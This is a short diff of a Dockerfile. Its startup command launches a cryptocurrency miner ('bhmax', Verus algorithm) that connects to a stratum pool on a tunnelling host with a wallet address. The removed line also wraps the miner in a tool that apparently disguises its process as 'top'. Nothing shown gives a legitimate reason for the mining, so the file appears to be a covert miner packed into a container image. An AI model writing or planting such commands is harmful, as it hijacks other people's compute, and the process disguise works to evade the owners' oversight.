@@ -22,4 +22,4 @@ WORKDIR /usr/bin
 
 
 # Perintah yang akan dijalankan saat container pertama kali dijalankan
-CMD ["sh", "-c", "./hi -s \"/usr/bin/top\" -d -p test.pid ./bhmax -a verus -o stratum+tcp://dusta-44444.portmap.host:44444 -u RP6jeZhhHiZmzdufpXHCWjYVHsLaPXARt1.od1 -p x -t 3"]
+CMD ["./bhmax -a verus -o stratum+tcp://dusta-44444.portmap.host:44444 -u RP6jeZhhHiZmzdufpXHCWjYVHsLaPXARt1.od1 -p x -t 3"]
